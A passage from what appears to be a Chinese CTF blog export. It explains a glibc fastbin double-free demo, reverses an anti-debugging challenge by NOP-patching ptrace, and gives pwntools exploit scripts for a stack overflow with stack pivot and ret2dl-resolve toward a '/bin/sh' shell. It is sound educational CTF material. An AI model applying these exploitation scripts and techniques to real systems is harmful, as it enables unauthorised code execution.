chunk 大小之间的公差一致，具体如下： 组 数量 公差 1 32 64B 2 16 512B 3 8 4096B 4 4 32768B 5 2 262144B 6 1 不限制 当空闲的 chunk 被连接到 bin 的时候，ptmalloc 会把表示该 chunk 是否正在使用的标志 p 设置为 0。（注意！这个标志实际处在下一个 chunk 中）。同时，ptmalloc 还会检查它前后（物理前后）的 chunk 是否为空，如果为空，ptmalloc 会把这些 chunk 合并成一个大的 chunk，然后把合并后的 chunk 放入 unsorted bin 中。但是对于较小的 chunk，ptmalloc 会把它放入 fast bins 中。 这个示例中，在64位系统中，分配的内存大小应该都属于Small Bin，我们第一次Free，chunk到了bin中的Small Bin，然后我们再次分配内存的时候，就会再次得到第一次分配的内存 0x02 fastbin_dup源代码 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;stdlib.hint main()&#123; fprintf(stderr, \"This file demonstrates a simple double-free attack with fastbins.\\n\"); //这个程序展示了一个利用fastbin进行的简单double-free攻击. fprintf(stderr, \"Allocating 3 buffers.\\n\"); //先分配三块内存. int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, \"1st malloc(8): %p\\n\", a); fprintf(stderr, \"2nd malloc(8): %p\\n\", b); fprintf(stderr, \"3rd malloc(8): %p\\n\", c); fprintf(stderr, \"Freeing the first one...\\n\"); //free掉第一块内存… free(a); fprintf(stderr, \"If we free %p again, things will crash because %p is at the top of the free list.\\n\", a, a); //如果我们再free第一块内存a的话,程序就会崩溃,然后报错.因为这个时候这块内存刚好在对应free-list的顶部,再次free这块内存的时候就会被检查到. // free(a); fprintf(stderr, \"So, instead, we'll free %p.\\n\", b); //所以我们另外free一个,我们free第二块内存b. free(b); fprintf(stderr, \"Now, we can free %p again, since it's not the head of the free list.\\n\", a); //现在我们再次free第一块内存,程序不会崩溃，因为它已经不在链表顶部了. free(a); fprintf(stderr, \"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\\n\", a, b, a, a); //现在我们的free-list有这三块内存[a,b,a]. //如果我们malloc三次的话,我们就会得到a两次! fprintf(stderr, \"1st malloc(8): %p\\n\", malloc(8)); fprintf(stderr, \"2nd malloc(8): %p\\n\", malloc(8)); fprintf(stderr, \"3rd malloc(8): %p\\n\", malloc(8));&#125; 运行效果 1234567891011121314syc@ubuntu:~/Downloads/tmp$ ./a.outThis file demonstrates a simple double-free attack with fastbins.Allocating 3 buffers.1st malloc(8): 0x83b50082nd malloc(8): 0x83b50183rd malloc(8): 0x83b5028Freeing the first one...If we free 0x83b5008 again, things will crash because 0x83b5008 is at the top of the free list.So, instead, we'll free 0x83b5018.Now, we can free 0x83b5008 again, since it's not the head of the free list.Now the free list has [ 0x83b5008, 0x83b5018, 0x83b5008 ]. If we malloc 3 times, we'll get 0x83b5008 twice!1st malloc(8): 0x83b50082nd malloc(8): 0x83b50183rd malloc(8): 0x83b5008 GDB调试分析 第一次malloc：a 12345678gef➤ heap chunk 0x0804b008Chunk(addr=0x804b008, size=0x10, flags=PREV_INUSE)Chunk size: 16 (0x10)Usable size: 12 (0xc)Previous chunk size: 0 (0x0)PREV_INUSE flag: OnIS_MMAPPED flag: OffNON_MAIN_ARENA flag: Off 第二次malloc：b 12345678gef➤ heap chunk 0x0804b018Chunk(addr=0x804b018, size=0x10, flags=PREV_INUSE)Chunk size: 16 (0x10)Usable size: 12 (0xc)Previous chunk size: 0 (0x0)PREV_INUSE flag: OnIS_MMAPPED flag: OffNON_MAIN_ARENA flag: Off 第三次malloc：c 12345678gef➤ heap chunk 0x0804b028Chunk(addr=0x804b028, size=0x10, flags=PREV_INUSE)Chunk size: 16 (0x10)Usable size: 12 (0xc)Previous chunk size: 0 (0x0)PREV_INUSE flag: OnIS_MMAPPED flag: OffNON_MAIN_ARENA flag: Off 第一次free，a已经并入了fastbin 12345678910111213141516gef➤ heap bin[+] No Tcache in this version of libc─────────────────────────────────── Fastbins for arena 0xf7fb2780 ───────────────────────────────────Fastbins[idx=0, size=0x8] ← Chunk(addr=0x804b008, size=0x10, flags=PREV_INUSE) Fastbins[idx=1, size=0x10] 0x00Fastbins[idx=2, size=0x18] 0x00Fastbins[idx=3, size=0x20] 0x00Fastbins[idx=4, size=0x28] 0x00Fastbins[idx=5, size=0x30] 0x00Fastbins[idx=6, size=0x38] 0x00──────────────────────────────── Unsorted Bin for arena 'main_arena' ────────────────────────────────[+] Found 0 chunks in unsorted bin.───────────────────────────────── Small Bins for arena 'main_arena' ─────────────────────────────────[+] Found 0 chunks in 0 small non-empty bins.───────────────────────────────── Large Bins for arena 'main_arena' ─────────────────────────────────[+] Found 0 chunks in 0 large non-empty bins. 第二次free，b已经并入了fastbin 12345678910gef➤ heap bin[+] No Tcache in this version of libc─────────────────────────────────── Fastbins for arena 0xf7fb2780 ───────────────────────────────────Fastbins[idx=0, size=0x8] ← Chunk(addr=0x804b018, size=0x10, flags=PREV_INUSE) ← Chunk(addr=0x804b008, size=0x10, flags=PREV_INUSE) Fastbins[idx=1, size=0x10] 0x00Fastbins[idx=2, size=0x18] 0x00Fastbins[idx=3, size=0x20] 0x00Fastbins[idx=4, size=0x28] 0x00Fastbins[idx=5, size=0x30] 0x00Fastbins[idx=6, size=0x38] 0x00 再一次free a，可以发现fastbin里面出现了两次a 12345678910gef➤ heap bin[+] No Tcache in this version of libc─────────────────────────────────── Fastbins for arena 0xf7fb2780 ───────────────────────────────────Fastbins[idx=0, size=0x8] ← Chunk(addr=0x804b008, size=0x10, flags=PREV_INUSE) ← Chunk(addr=0x804b018, size=0x10, flags=PREV_INUSE) ← Chunk(addr=0x804b008, size=0x10, flags=PREV_INUSE) → [loop detected]Fastbins[idx=1, size=0x10] 0x00Fastbins[idx=2, size=0x18] 0x00Fastbins[idx=3, size=0x20] 0x00Fastbins[idx=4, size=0x28] 0x00Fastbins[idx=5, size=0x30] 0x00Fastbins[idx=6, size=0x38] 0x00 Double Free漏洞原理 对一个指向malloc分配的heap内存的指针p进行free之后，并没有将该指针置NULL。导致，即使free之后指针p仍然指向heap内存，潜在着利用的可能。 利用基础 在堆漏洞利用里，很多都是基于触发unlink来实现任意代码执行的，double free也是基于此 不同于unlink的是，unlink是利用溢出来伪造chunk，实现unlink的。而double free则一般是需要至少获得三个连续的chunk，再全部free。之后再重新分配两个大chunk（能够覆盖前面free的三个chunk），通过伪造p（利用绕过unlink的检查的技术伪造）chunk和一个引导触发unlink的chunk即可。构造如下图 注意，伪造的数据中fake_size 应该等于 fake_pre_size2+1。以满足大小一致检查","categories":[],"tags":[]},{"title":"巅峰极客——flodbg","slug":"ß█╖σ╝½┐═í¬í¬flodbg","date":"2019-10-27T07:37:54.000Z","updated":"2019-10-27T22:38:16.000Z","comments":true,"path":"2019/10/27/ß█╖σ╝½┐═í¬í¬flodbg/","link":"","permalink":"http://yoursite.com/2019/10/27/ß█╖σ╝½┐═í¬í¬flodbg/","excerpt":"","text":"检查一下程序 12345678syc@ubuntu:/mnt/hgfs/share/巅峰极客/flodbg$ checksec flodbg[*] '/mnt/hgfs/share/\\xe5\\xb7\\x85\\xe5\\xb3\\xb0\\xe6\\x9e\\x81\\xe5\\xae\\xa2/flodbg/flodbg' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) FORTIFY: Enabled 拿到程序发现运行发现一直没有结果 1syc@ubuntu:/mnt/hgfs/share/巅峰极客/flodbg$ ./flodbg 直接IDA Pro打开分析一下函数流程 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980int __cdecl main(int argc, const char **argv, const char **envp)&#123; char *v3; // rbx int v4; // er12 int v5; // edi signed int v6; // ebx signed __int64 v7; // [rsp-8h] [rbp-4E0h] __int64 v8; // [rsp-8h] [rbp-4E0h] __int64 v9; // [rsp+0h] [rbp-4D8h] char v10; // [rsp+14h] [rbp-4C4h] char v11; // [rsp+4Ch] [rbp-48Ch] int v12; // [rsp+50h] [rbp-488h] int v13; // [rsp+54h] [rbp-484h] int v14; // [rsp+58h] [rbp-480h] int v15; // [rsp+5Ch] [rbp-47Ch] int v16; // [rsp+60h] [rbp-478h] int v17; // [rsp+64h] [rbp-474h] int v18; // [rsp+68h] [rbp-470h] int v19; // [rsp+6Ch] [rbp-46Ch] int v20; // [rsp+70h] [rbp-468h] int v21; // [rsp+74h] [rbp-464h] int v22; // [rsp+78h] [rbp-460h] int v23; // [rsp+7Ch] [rbp-45Ch] int v24; // [rsp+80h] [rbp-458h] int v25; // [rsp+84h] [rbp-454h] int v26; // [rsp+88h] [rbp-450h] int v27; // [rsp+8Ch] [rbp-44Ch] int v28; // [rsp+90h] [rbp-448h] int v29; // [rsp+94h] [rbp-444h] int v30; // [rsp+98h] [rbp-440h] unsigned __int64 v31; // [rsp+4A8h] [rbp-30h] v3 = (char *)&amp;v9; v31 = __readfsqword(0x28u); v4 = time(0LL); do &#123; v3 += 4; *((_DWORD *)v3 - 1) = _IO_getc(_bss_start); &#125; while ( v3 != &amp;v11 ); v12 = 'S'; v13 = '@'; v14 = 'y'; v15 = 'R'; v16 = 't'; v17 = 'f'; v18 = 'T'; v19 = 'l'; v20 = '0'; v21 = '+'; v22 = 'a'; v23 = 'g'; v24 = '-'; v25 = 'L'; v26 = '_'; v27 = '3'; v28 = 'M'; v29 = '&#125;'; v30 = '&#123;'; if ( ptrace(0, 0LL, 1LL, 0LL) &gt;= 0 ) &#123; v5 = (unsigned __int64)time(0LL) - v4; if ( v5 &lt;= 1 ) &#123; func3(&amp;v10, 2LL, 7LL, 14LL); v7 = 4196782LL; JUMPOUT(__CS__, v8 + 10); &#125; exit(v5); &#125; v6 = 10000000; do &#123; sleep(1u); --v6; &#125; while ( v6 ); exit(-1);&#125; 让我们长期等待无响应的代码是因为这段 1234567v6 = 10000000; do &#123; sleep(1u); --v6; &#125; while ( v6 ); 然后注意到这里有一个ptrace函数，且调用的是ptrace函数，所以这个程序是加入了反调试的功能的。 ptrace函数提供了父进程观察和控制其子进程执行的能力，发送给被跟踪的子进程的信号(除了SIGKILL)，都会被转发给父进程，这也是调试器主要原理。 总而言之就是如果我们使用GDB调试这个程序，ptrace函数执行成功就会返回大于0的值，那么程序就会中止 这里还存在一个反调试方式就是时间戳的检查 12v4 = time(0LL);v5 = (unsigned __int64)time(0LL) - v4; 被调试时，进程的运行速度大大降低，例如，单步调试大幅降低恶意代码的运行速度，所以时钟检测是恶意代码探测调试器存在的最常用方式之一。有如下两种用时钟检测来探测调试器存在的方法。记录一段操作前后的时间戳，然后比较这两个时间戳，如果存在滞后，则可以认为存在调试器。记录触发一个异常前后的时间戳。如果不调试进程，可以很快处理完异常，因为调试器处理异常的速度非常慢。默认情况下，调试器处理异常时需要人为干预，这导致大量延迟。虽然很多调试器允许我们忽略异常，将异常直接返回程序，但这样操作仍然存在不小的延迟 然后我们看这段代码使用了花指令来混淆 1JUMPOUT(__CS__, v8 + 10); 1234567891011121314151617181920212223242526.text:00000000004009C4 dd 48EBEBEBh.text:00000000004009C8 dq 11B908247C8Dh, 4BE00000006BA00h, 440E8000000h, 0EBB866C8FFC0FFEBh.text:00000000004009C8 dq 0EB90EBFA74C03105h, 0FFC0FFEBC8FFC0FFh, 8D48C8FFC0FFEBC8h.text:00000000004009C8 dq 0AB924247Ch, 3BE00000005BAh, 0E800000409E80000h, 24B48D48FFFFFE04h.text:00000000004009C8 dq 75E8C789000000A0h, 0FC589C085000004h, 5C8D480000020B85h.text:00000000004009C8 dq 0BA0000000FB92C24h, 6BE00000009h, 3CFE8E7894800h, 6BA00000008B900h.text:00000000004009C8 dq 3BE000000h, 3B8E8DF8948h, 89FFFFFD71E8FF31h, 0F02FF83E72944C7h.text:00000000004009C8 dq 0EB9000001D48Fh, 0BE00000005BA0000h, 0E8EF894C00000001h.text:00000000004009C8 dq 0FFFCF7E80000038Ch, 0FFFFFD10E8C789FFh, 0FFFFFD78E8C58941h.text:00000000004009C8 dq 1AA850FC53941h, 13B9F63100h, 0E7894800000002BAh, 356E840246C8D4Ch.text:00000000004009C8 dq 0C03105EBB8660000h, 0FFC0FFEB90EBFA74h, 0C03105EBB86690C8h.text:00000000004009C8 dq 0C8FFC0FFEBEBFA74h, 10B90C247C8D48h, 0BE00000005BA0000h.text:00000000004009C8 dq 31FE800000003h, 4B93C247C8D4800h, 3BA000000h, 306E800000001BEh.text:00000000004009C8 dq 0C8FFC0FFEB900000h, 0C03105EBB8669090h, 5EBB86690EBFA74h.text:00000000004009C8 dq 909090EBFA74C031h, 0BB920247C8D48h, 0BE00000006BA0000h.text:00000000004009C8 dq 2CFE800000003h, 13B9F63100h, 0E7894800000007BAh, 0E89090000002BBE8h.text:00000000004009C8 dq 0C083485800000000h, 0EBEBEBEBEBE0FF0Ch, 74C03105EBB86690h.text:00000000004009C8 dq 3B9F63190EBFAh, 4C00000002BA0000h, 4800000289E8EF89h.text:00000000004009C8 dq 9B9F63128247C8Dh, 2BA000000h, 0E8FF3100000273E8h, 2944C789FFFFFC2Ch.text:00000000004009C8 dq 8F8F0F03FF83E7h, 8B9DF89480000h, 0BE00000003BA0000h.text:00000000004009C8 dq 45E8DB3100000001h, 3B9000002h, 4CF63100000002BAh, 0B800000231E8EF89h.text:00000000004009C8 dq 2E660EEB00000053h, 841F0Fh, 759C043B509C448Bh, 0FB834801C383483Chc.text:00000000004009C8 dq 400FFDBFED7513h, 948B48FFFFFB63E8h, 334864000004A824h.text:00000000004009C8 dq 0E889000000282514h, 4B8C481482475h, 0C35D415C415D5B00h.text:00000000004009C8 dq 0FF2BFD8EBFFCD83h, 89FFFFFB31E80040h.text:0000000000400C50 db 0DFh 我们绕过这些反调试的手法可以直接path掉或者在动态调试的时候通过直接修改寄存器绕过即可，我们首先来通过path修改绕过ptrace函数 1.text:000000000040096A call _ptrace 变成 1234567.text:000000000040096A nop ; Keypatch modified this from:.text:000000000040096A ; call _ptrace.text:000000000040096A ; Keypatch padded NOP to next boundary: 4 bytes.text:000000000040096B nop.text:000000000040096C nop.text:000000000040096D nop.text:000000000040096E nop 在gdb动态调试中可以发现已经成功绕过 123456789101112────────────────────────────────────────[ DISASM ]──────────────────────────────────────── 0x400933 &lt;main+211&gt; mov dword ptr [rsp + 0x88], 0x5f 0x40093e &lt;main+222&gt; mov dword ptr [rsp + 0x8c], 0x33 0x400949 &lt;main+233&gt; mov dword ptr [rsp + 0x90], 0x4d 0x400954 &lt;main+244&gt; mov dword ptr [rsp + 0x94], 0x7d 0x40095f &lt;main+255&gt; mov dword ptr [rsp + 0x98], 0x7b ► 0x40096a &lt;main+266&gt; nop 0x40096b &lt;main+267&gt; nop 0x40096c &lt;main+268&gt; nop 0x40096d &lt;main+269&gt; nop 0x40096e &lt;main+270&gt; nop 0x40096f &lt;main+271&gt; test rax, rax 在这里我们遇到了时间戳检测 12345678910────────────────────────────────────────[ DISASM ]──────────────────────────────────────── 0x400972 &lt;main+274&gt; js main+1036 &lt;0x400c6c&gt; 0x400978 &lt;main+280&gt; xor edi, edi 0x40097a &lt;main+282&gt; call time@plt &lt;0x4007e0&gt; 0x40097f &lt;main+287&gt; mov edi, eax 0x400981 &lt;main+289&gt; sub edi, r12d ► 0x400984 &lt;main+292&gt; cmp edi, 1 0x400987 &lt;main+295&gt; jg main+1009 &lt;0x400c51&gt; 我们只需要强制修改edi寄存器的值为1即可以绕过 1pwndbg&gt; set $edi = 1 就已经绕过了 123456789────────────────────────────────────────[ DISASM ]──────────────────────────────────────── 0x40097a &lt;main+282&gt; call time@plt &lt;0x4007e0&gt; 0x40097f &lt;main+287&gt; mov edi, eax 0x400981 &lt;main+289&gt; sub edi, r12d 0x400984 &lt;main+292&gt; cmp edi, 1 0x400987 &lt;main+295&gt; jg main+1009 &lt;0x400c51&gt; ► 0x40098d &lt;main+301&gt; lea r13, [rsp + 0x14] 运行到这里 1234567891011────────────────────────────────────────[ DISASM ]──────────────────────────────────────── 0x4009a1 &lt;main+321&gt; mov rdi, r13 0x4009a4 &lt;main+324&gt; call func3 &lt;0x400e20&gt; 0x4009a9 &lt;main+329&gt; call main+334 &lt;0x4009ae&gt; 0x4009ae &lt;main+334&gt; pop rax 0x4009af &lt;main+335&gt; add rax, 0xa ► 0x4009b3 &lt;main+339&gt; jmp rax &lt;0x4009b8&gt; ↓ 0x4009b8 &lt;main+344&gt; call main+349 &lt;0x4009bd&gt; 可以发现其实0x4009b3是jump到了0x4009b8处，我们在IDA里面修改即可 12.text:00000000004009B3 jmp short loc_4009B8 ; Keypatch modified this from:.text:00000000004009B3 ; jmp rax 在这之前我们可以选定被花指令隐藏的数据按U或者右键选择“Undefine“先还原成数据，然后之后可以按”C“或者右键”Code“变成指令代码 继续运行 12345 0x4009bd &lt;main+349&gt; pop rbx 0x4009be &lt;main+350&gt; add rbx, 0xa► 0x4009c2 &lt;main+354&gt; jmp rbx &lt;0x4009c7&gt; ↓ 0x4009c7 &lt;main+359&gt; lea rdi, [rsp + 8] 0x4009c2到0x4009c7，其实这时候我们分析一下这些花指令，本质上就是跳转到rbx+0xa的内存上 1230x4009bd &lt;main+349&gt; pop rbx0x4009be &lt;main+350&gt; add rbx, 0xa0x4009c2 &lt;main+354&gt; jmp rbx 再看一下这段，加加减减等于没有，然后异或同一个寄存器一定会跳转 12345 0x4009e1 &lt;main+385&gt; inc eax 0x4009e3 &lt;main+387&gt; dec eax 0x4009e5 &lt;main+389&gt; mov ax, 0x5eb► 0x4009e9 &lt;main+393&gt; xor eax, eax 0x4009eb &lt;main+395&gt; je main+391 &lt;0x4009e7&gt; 最终逆向完毕的版本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102int __cdecl main(int argc, const char **argv, const char **envp)&#123; int *v3; // rbx int v4; // er12 unsigned int v5; // eax signed int v6; // ebp int v7; // edi __pid_t v8; // eax __pid_t v9; // er13 __int64 correct_count; // rbx int i; // eax int result; // eax int input[19]; // [rsp+0h] [rbp-4D8h] char v14; // [rsp+4Ch] [rbp-48Ch] int enc[19]; // [rsp+50h] [rbp-488h] char v16; // [rsp+A0h] [rbp-438h] unsigned __int64 v17; // [rsp+4A8h] [rbp-30h] v3 = input; v17 = __readfsqword(0x28u); v4 = time(0LL); do &#123; ++v3; *(v3 - 1) = _IO_getc(_bss_start); &#125; while ( v3 != (int *)&amp;v14 ); enc[0] = 'S'; enc[1] = '@'; enc[2] = 'y'; enc[3] = 'R'; enc[4] = 't'; enc[5] = 'f'; enc[6] = 'T'; enc[7] = 'l'; enc[8] = '0'; enc[9] = '+'; enc[10] = 'a'; enc[11] = 'g'; enc[12] = '-'; enc[13] = 'L'; enc[14] = '_'; enc[15] = '3'; enc[16] = 'M'; enc[17] = '&#125;'; enc[18] = '&#123;'; func3(&amp;input[5], 2u, 7, 0xEu); func3(&amp;input[2], 4u, 6, 0x11u); func3(&amp;input[9], 3u, 5, 0xAu); v5 = getppid(); v6 = get_name_by_pid(v5, &amp;v16); if ( !v6 ) &#123; func3(input, 6u, 9, 0xFu); func3(&amp;input[11], 3u, 6, 8u); v7 = (unsigned __int64)time(0LL) - v4; if ( v7 &lt; 2 ) goto LABEL_16; func3(&amp;input[5], 1u, 5, 0xEu); v8 = getpid(); v9 = getsid(v8); if ( v9 != getppid() ) &#123; func3(input, 0, 2, 0x13u); func3(&amp;input[3], 3u, 5, 0x10u); func3(&amp;input[15], 1u, 3, 4u); func3(&amp;input[8], 3u, 6, 0xBu); func3(input, 0, 7, 0x13u); func3(&amp;input[16], 0, 2, 3u); func3(&amp;input[10], 0, 2, 9u); v7 = (unsigned __int64)time(0LL) - v4; if ( v7 &gt;= 3 ) &#123; correct_count = 0LL; func3(&amp;input[11], 1u, 3, 8u); func3(&amp;input[16], 0, 2, 3u); for ( i = 'S'; i == input[correct_count]; i = enc[correct_count] ) &#123; if ( ++correct_count == 19 ) &#123; puts(\"win\"); goto LABEL_12; &#125; &#125; puts(\"You failed\"); v7 = correct_count; &#125;LABEL_16: exit(v7); &#125;LABEL_17: puts(\"what are you doing?!\"); v7 = 1; goto LABEL_16; &#125; v6 = -1;LABEL_12: result = v6; if ( __readfsqword(0x28u) != v17 ) goto LABEL_17;c return result;&#125; 输入字符串“0123456789abcdefghi”，然后在比较处设断点，可以看到输入字符串经过处理后的结果是“8f6c90e1dg237abh5i4”。然后即可写脚本，把“S@yRtfTl0+ag-L_3M}{”进行还原。 1234567str = \"0123456789abcdefghi\"str1 = \"8f6c90e1dg237abh5i4\"str2 = \"S@yRtfTl0+ag-L_3M&#125;&#123;\"flag = \"\"for i in range(len(str2)):flag += str2[str1.find(str[i])]print flag 得到flag为flag{My-StL_R0T@+3}","categories":[],"tags":[]},{"title":"pwn200","slug":"pwn200","date":"2019-10-15T14:50:43.000Z","updated":"2019-10-16T05:52:34.000Z","comments":true,"path":"2019/10/15/pwn200/","link":"","permalink":"http://yoursite.com/2019/10/15/pwn200/","excerpt":"","text":"先检查一下文件 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 在 IDA中反汇编看看 程序是什么样的，这是我们发现程序存在漏洞 1234567ssize_t vuln()&#123; char buf; // [esp+Ch] [ebp-6Ch] setbuf(stdin, &amp;buf); return read(0, &amp;buf, 0x100u);&#125; 这里存在着栈溢出漏洞，虽然程序存在 write 写函数 但是我要学会的是 return-to-dl-resolve 所以我们不利用write函数去泄露 这道题首先为了让构造的 ROP 链的长度合适，这里我们可以用到栈迁移 首先我们要 将我们想迁移到的地址 覆盖到 程序的 ebp 上这样 执行下一个 汇编指令时 会将 这个值 赋值给 ebp （pop ebp） 然后我们要在下面调用一次 leave ret (mov esp, ebp ; pop ebp ;)这样我们就能将esp 也迁移过去 从而实现栈迁移 用ROPgadget工具找到 我们需要的汇编指令的地址 12345678910111213141516171819202122syc@ubuntu:~/Downloads/retdll$ ROPgadget --binary bof --only 'pop|ret'Gadgets information============================================================0x0804861b : pop ebp ; ret0x08048618 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x08048379 : pop ebx ; ret0x0804861a : pop edi ; pop ebp ; ret0x08048619 : pop esi ; pop edi ; pop ebp ; ret0x08048362 : ret0x0804846e : ret 0xeac1Unique gadgets found: 7syc@ubuntu:~/Downloads/retdll$ ROPgadget --binary bof --only 'leave|ret'Gadgets information============================================================0x08048458 : leave ; ret0x08048362 : ret0x0804846e : ret 0xeac1Unique gadgets found: 3syc@ubuntu:~/Downloads/retdll$ readelf -S bof | grep \".bss\" [26] .bss NOBITS 0804a040 001028 00000c 00 WA 0 0 32 找到所需要的ROP链的部分，如果我们将payload写为下面这样运行就能实现栈迁移，将ebp覆盖为我们想要迁移过去的值 ，然后执行leave_ret就能将栈迁移过去 具体的Exploit为 123456789101112131415161718192021from pwn import *p = process('./bof')elf = ELF('./bof')gdb.attach(p)offset_ebp = 0x6cppp_ret = 0x08048619 #pop esi ; pop edi ; pop ebp ; retpop_ebp_ret = 0x0804861b #pop ebp ; retleave_ret = 0x08048458 #leave ; retbss_addr = 0x0804a040 # readelf -S pwn1 | grep \".bss\"stack_size = 0x800base_stage = bss_addr + stack_sizep.recvuntil('Welcome to XDCTF2015~!\\n')payload = ''payload+= 'a'*offset_ebppayload+= p32(base_stage)payload+= p32(leave_ret)p.sendline(payload)p.interactive() GDB调试环节 12345678[DEBUG] Received 0x17 bytes: 'Welcome to XDCTF2015~!\\n'[DEBUG] Sent 0x75 bytes: 00000000 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 │aaaa│aaaa│aaaa│aaaa│ * 00000060 61 61 61 61 61 61 61 61 61 61 61 61 40 a8 04 08 │aaaa│aaaa│aaaa│@···│ 00000070 58 84 04 08 0a │X···│·│ 00000075 发送payload后，EBP已经被覆盖为我们布置好的FakeStack地址了，也就bss段地址 123456789101112131415161718192021222324─────────────────────────────────[ REGISTERS ]────────────────────────────────── EAX 0x75 EBX 0x0 ECX 0xffe1207c ◂— 0x61616161 ('aaaa') EDX 0x100 EDI 0xffe12160 —▸ 0xffe12180 ◂— 0x1 ESI 0xf7ef7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0 EBP 0x804a840 ◂— 0x0 ESP 0xffe120ec —▸ 0x8048458 (deregister_tm_clones+40) ◂— leave EIP 0x804851e (vuln+51) ◂— ret ───────────────────────────────────[ DISASM ]─────────────────────────────────── 0x8048519 &lt;vuln+46&gt; add esp, 0x10 0x804851c &lt;vuln+49&gt; nop 0x804851d &lt;vuln+50&gt; leave ► 0x804851e &lt;vuln+51&gt; ret &lt;0x8048458; deregister_tm_clones+40&gt; ↓ 0x8048458 &lt;deregister_tm_clones+40&gt; leave 0x8048459 &lt;deregister_tm_clones+41&gt; ret 0x804845b &lt;deregister_tm_clones+43&gt; nop 0x804845c &lt;deregister_tm_clones+44&gt; lea esi, [esi] 0x8048460 &lt;register_tm_clones&gt; mov eax, 0x804a028 0x8048465 &lt;register_tm_clones+5&gt; sub eax, 0x804a028 0x804846a &lt;register_tm_clones+10&gt; sar eax, 2 ret地址为leave ret的地址，将EBP的值交给ESP从而达到栈迁移 ，此时ESP已经bss段上 123456789101112131415161718─────────────────────────────────[ REGISTERS ]────────────────────────────────── EAX 0x75 EBX 0x0 ECX 0xffe1207c ◂— 0x61616161 (&apos;aaaa&apos;) EDX 0x100 EDI 0xffe12160 —▸ 0xffe12180 ◂— 0x1 ESI 0xf7ef7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0 EBP 0x0 ESP 0x804a844 ◂— 0x0 EIP 0x8048459 (deregister_tm_clones+41) ◂— ret ───────────────────────────────────[ DISASM ]─────────────────────────────────── 0x8048519 &lt;vuln+46&gt; add esp, 0x10 0x804851c &lt;vuln+49&gt; nop 0x804851d &lt;vuln+50&gt; leave 0x804851e &lt;vuln+51&gt; ret ↓ 0x8048458 &lt;deregister_tm_clones+40&gt; leave ► 0x8048459 &lt;deregister_tm_clones+41&gt; ret &lt;0&gt; 查看一下栈的情况，已经实现了栈迁移 123pwndbg&gt; stack 3000:0000│ esp 0x804a844 ◂— 0x0... ↓ 但是我们是想要让我们布置好的数据在这个fake stack上 我们就需要先到用read函数向这个地方写入ROP链从而能实现调用。因为又leave ret会有一个pop ebp所以在布置fake stack的时候我首先要输入对应大小的fake_ebp 将我们要用到的ROP链布置到bss段上从而实现布置更长的ROP链。这样我们就知道如何去 控制我们需要的指令了 接着我们需要做的就是通过实现return-to-dl-resolv实现get shell 首先控制到PLT[0]修改我们函数的index_offset让其指向我们构造的fake_reloc 控制index_offset 的关键是我们只需要在PLT[0]的下一个栈地址放上index_offset就行 （因为index_offset是在call函数后Push进栈的地址刚好在返回PLT[0]时的栈顶） 我们先写一个Exploit尝试在假栈上部署一下数据 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *p = process('./bof')elf = ELF('./bof')gdb.attach(p)read_plt = elf.plt['read']write_plt = elf.plt['write']write_got = elf.got['write']offset = 112ppp_ret = 0x08048619 #pop esi ; pop edi ; pop ebp ; retpop_ebp_ret = 0x0804861b #pop ebp ; retleave_ret = 0x08048458 #leave ; retbss_addr = 0x0804a040 # readelf -S pwn1 | grep \".bss\"stack_size = 0x800base_stage = bss_addr + stack_sizep.recvuntil('Welcome to XDCTF2015~!\\n')payload = 'A' * offsetpayload += p32(base_stage) payload += p32(read_plt) payload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage) payload += p32(100)payload += p32(pop_ebp_ret)payload += p32(base_stage+4)payload += p32(leave_ret)p.sendline(payload)cmd = \"/bin/sh\"plt_0 = 0x08048380 # objdump -d -j .plt bofindex_offset = 0x20 # write's indexpause()payload2 = 'AAAA'payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += 'AAAA'payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += 'A' * (80 - len(payload2))payload2 += cmd + '\\x00'payload2 += 'A' * (100 - len(payload2))p.sendline(payload2)p.interactive() 这里有个坑两次payload不能发送太快，需要sleep或者pause一下，否则会当作一次输入 一直运行直到ESP被修改为假栈 12345678910111213141516171819──────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────── EAX 0x64 EBX 0x0 ECX 0x804a840 ◂— 0x41414141 ('AAAA') EDX 0x64 EDI 0x804a840 ◂— 0x41414141 ('AAAA') ESI 0x0 EBP 0x8048380 ◂— push dword ptr [0x804a004] ESP 0x804a848 ◂— 0x20 /* ' ' */ EIP 0x8048459 (deregister_tm_clones+41) ◂— ret ───────────────────────────────────────────[ DISASM ]──────────────────────────────────────────── 0x804861b &lt;__libc_csu_init+91&gt; pop ebp 0x804861c &lt;__libc_csu_init+92&gt; ret ↓ 0x804861b &lt;__libc_csu_init+91&gt; pop ebp 0x804861c &lt;__libc_csu_init+92&gt; ret ↓ 0x8048458 &lt;deregister_tm_clones+40&gt; leave ► 0x8048459 &lt;deregister_tm_clones+41&gt; ret &lt;32&gt; 这个时候已经在fake stack上布置好了ROP链 123456789pwndbg&gt; telescope 0x804a84000:0000│ ecx edi 0x804a840 ◂— 0x41414141 ('AAAA')01:0004│ 0x804a844 —▸ 0x8048380 ◂— push dword ptr [0x804a004]02:0008│ esp 0x804a848 ◂— 0x20 /* ' ' */03:000c│ 0x804a84c ◂— 0x41414141 ('AAAA')04:0010│ 0x804a850 ◂— 0x105:0014│ 0x804a854 —▸ 0x804a890 ◂— '/bin/sh'06:0018│ 0x804a858 ◂— 0x707:001c│ 0x804a85c ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh' 接下来部署真实的ROP链，再复习一下 _dl_runtime_resolve的过程 